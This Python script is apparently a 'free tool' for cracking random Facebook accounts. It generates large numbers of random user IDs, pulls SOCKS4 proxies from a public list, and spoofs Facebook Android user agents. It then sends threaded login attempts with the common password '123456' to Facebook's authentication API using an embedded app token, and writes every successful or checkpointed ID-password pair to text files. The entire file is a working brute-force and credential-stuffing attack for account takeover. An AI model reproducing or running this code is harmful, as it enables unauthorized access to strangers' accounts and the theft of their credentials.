D = '\033[90;1m'
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
def main(arg):
        try:
            os.mkdir('SECDET')
        except OSError:
            pass
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.030)
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.today().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okk = datetime.datetime.now().strftime('%I:%M:%S')
okc = str(tgl)+'-'+str(bln)+'-'+str(thn)
cpc = str(tgl)+'-'+str(bln)+'-'+str(thn)+"->>"+str(okk)

def danger(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.2)
def load(word):
    lix = [
     '\033[97;1m/', '\033[91;1m-', '\033[93;1m╲', '\033[92;1m|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.1)
            sys.stdout.flush()
def off(word):
    lix = [
     '\033[97;1m✈', '\033[91;1m✈✈', '\033[93;1m✈✈✈', '\033[92;1m✈✈✈✈']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.1)
            sys.stdout.flush()

def hi(word):
    lix = [
     '\033[97;1m●', '\033[91;1m●●', '\033[93;1m●●●', '\033[92;1m●●●●']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.1)
            sys.stdout.flush()

oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
for xd in range(1000):
  fban_devices = [
    'samsung',
    'huawei',
    'xiaomi',
    'oppo',
    'vivo',
    'nokia',
    'lg',
    'sony',
    'motorola',
    'htc',
    'oneplus',
    'google'
  ]
  fban_versions = [
    '60.0.0.16.76',
    '61.0.0.15.69',
    '62.0.0.14.68',
    '63.0.0.13.67',
    '64.0.0.12.66',
    '65.0.0.11.65',
    '66.0.0.10.64',
    '67.0.0.9.63',
    '68.0.0.8.62',
    '69.0.0.7.61',
    '70.0.0.6.60',
  ]
  android_versions = [
    '13',
    '12',
    '11',
    '10',
    '9',
    '8',
    '7',
    '6',
  ]

  device = random.choice(fban_devices)
  version = random.choice(fban_versions)
  android_version = random.choice(android_versions)

  # Create the user agent string.
  user_agent = ''
  user_agent += 'Dalvik/2.1.0 (Linux; U; Android {} '.format(android_version)
  user_agent += '; {} Build/{})'.format(device, device)
  user_agent += ' [FBAN/FB4A;FBAV/{} '.format(version)
  user_agent += ';FBPN/com.facebook.katana;FBLC/en_US;FBBV/20454129;FBBD/{} '.format(device)
  user_agent += ';FBDV/{} '.format(device)
  user_agent += ';FBSV/10;FBCA/arm64-v8a:armeabi-v7a;FBDM/{density=3.25,width=1080,height=2028};FB_FW/1]'
  ugen.append(user_agent)
#uaku2='Davik/2.1.0 (Linux; U; Android 13.0.1; GT-S6810E Build/KOT49H) [FBAN/FB4A;FBAV/59.0.0.0.189;FBBV/20097196;FBDM/{density=1.5,width=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVFBDV/GT-S6810E;FBSV/5.0.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
logo = ("""\033[94;1m
\033[97;1m
\033[91;1m  ██████ ▓█████  ▄████▄  ▓█████▄ ▓█████▄▄▄█████▓
\033[91;1m▒██    ▒ ▓█   ▀ ▒██▀ ▀█  ▒██▀ ██▌▓█   ▀▓  ██▒ ▓▒
\033[91;1m░ ▓██▄   ▒███   ▒▓█    ▄ ░██   █▌▒███  ▒ ▓██░ ▒░
\033[91;1m  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█▄   ▌▒▓█  ▄░ ▓██▓ ░
\033[91;1m▒██████▒▒░▒████▒▒ ▓███▀ ░░▒████▓ ░▒████▒ ▒██▒ ░
\033[90;1m▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░░
\033[90;1m░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ▒  ▒  ░ ░  ░   ░
\033[94;1m░  ░  ░     ░   ░         ░ ░  ░    ░    ░
\033[94;1m      ░     ░  ░░ ░         ░       ░  ░
\033[91;1m                ░         ░
\t\033[90;1m                               \033[90;1m╔═══════════════════╗ 
            \033[91;1m                             \033[91;1mADNAN\033[94;1m ADIF \033[91;1mHISHAM
                                       \033[90;1m╚═══════════════════╝
\t\033[1;94m╔═══════════════════════╗
\t\033[1;92m  [•] TOOL NAME : FYM
\t\033[1;93m  [•] VERSION   : V.02
\t\033[1;91m╚═══════════════════════╝
""")
logo2= ("""


\t \033[1;92m________  __      __  __       __ 
\t\033[1;91m/        |/  \    /  |/  \     /  |
\t\033[1;93m$$$$$$$$/ $$  \  /$$/ $$  \   /$$ |
\t\033[1;94m$$ |__     $$  \/$$/  $$$  \ /$$$ |
\t\033[1;97m$$    |     $$  $$/   $$$$  /$$$$ |
\t\033[1;90m$$$$$/       $$$$/    $$ $$ $$/$$ |
\t\033[1;91m$$ |          $$ |    $$ |$$$/ $$ |
\t\033[1;93m$$ |          $$ |    $$ | $/  $$ |
\t\033[1;96m$$/           $$/     $$/      $$/ 
                                       \033[90;1m╔═══════════════════╗ 
            \033[91;1m                             \033[91;1mADNAN\033[94;1m ADIF \033[91;1mHISHAM
                                       \033[90;1m╚═══════════════════╝
\t\033[1;94m╔═══════════════════════╗
\t\033[1;92m  [•] TOOL NAME : ING
\t\033[1;93m  [•] VERSION   : V.01
\t\033[1;91m╚═══════════════════════╝
""")
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print("""\033[0;94m\t╔════════════╗
\t\x1b[0m  \x1b[1;97m\x1b[1;41mFREE TOOL\x1b[0m\x1b[1;97m
\033[0;91m\x1b\t ╚════════════╝""")
		print("\033[0;94m╔═══════════════════════════════════════════╗")
		print("\033[0;93m [•] TIME      : \033[92;1m"+okk)
		print("\033[0;91m╚═══════════════════════════════════════════╝")
		print("\033[0;94m╔════════════════════════════════════════╗")
		print("%s  [%s1%s]%s CRACK RANDOM FB ID 2008-9 \033[0;92m[PREMIUM]%s"%(R,G,R,W,R))
		print("\033[0;91m  [E] EXIT")
		print("\033[0;91m╚════════════════════════════════════════╝")
		
		SecDet =input("\n%s [?] CHOICE : "%(W))
		
		if SecDet in ["1", "01"]:
				self.old7()
		else:
				exit()
		if SecDet in ["E","e"]:
			exit("GOOD BYE")
		else:
			print("\n\t\t%s SELECT CORRECTLY"%(R))
			time.sleep(1)
			Main()
	def old7(self):
		x = 11111
		xx = 99999
		idx="93"
		os.system('clear')
		limit=99999
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			with ThreadPoolExecutor(max_workers=30) as coeg:
				listpass ='123456' #input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				load("\t\tPLEASE WAIT TOOL RUNING >--")
				off("\t\tIF ID NOT COMING TURN ON AIRPLANE MOOD 10SEC ")
				os.system("clear")
				hi("\t\t [+] TOTAL ID -> %s\033[0;97m "%(len(self.id)))
				os.system("clear")
				print(logo)
				print("\033[0;94m╔════════════════════════════════════════════╗")
				
				print("\033[0;94m║\033[93;1m\t [+] BRUTE HAS BEEN START            \033[0;94m║ ")
				print("\033[91;1m║\033[92;1m[•] CLONING TIME: "+cpc+"\033[91;1m ║")
				print("\033[0;91m╚════════════════════════════════════════════╝")
				print("\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		pro = random.choice(user_agent)
		session = requests.Session()
		sys.stdout.write(
			"\r \x1b[1;31;40m[\033[91;1m●\033[93;1m ●\033[92;1m ●] \033[97;1m[\033[93;1m%s/\033[91;1m%s] \x1b[1;31;40m\033[0;92m\x1b[1;32;40m[OK %s] \x1b[1;31;40m\033[90;1m[CP %s]\x1b[0m"%(self.loop, len(self.id), len(self.ok),len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": pro, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ SECDET-OK ]  \x1b[1;30;40m \x1b[1;33;40m\x1b[1;34;40m %s|\x1b[1;30;40m\x1b[1;34;40m\033[93;1m%s\033[0;97m        "%(uid, pw))
				print("\033[0;92mUserAgent > ","\033[0;94m",user_agent)
				self.ok.append("%s|%s"%(uid, pw))
				open("Secdet-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;95m[ SECDET-CP ]  \x1b[1;30;40m \x1b[1;33;40m\x1b[1;34;40m %s|\x1b[1;30;40m\x1b[1;34;40m\033[93;1m%s\033[0;97m        "%(uid, pw))
				print("\033[0;92mUserAgent > ","\033[0;91m",user_agent)
				self.cp.append("%s|%s"%(uid, pw))
				open("secdet-cp.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
				
		self.loop +=1
Main()
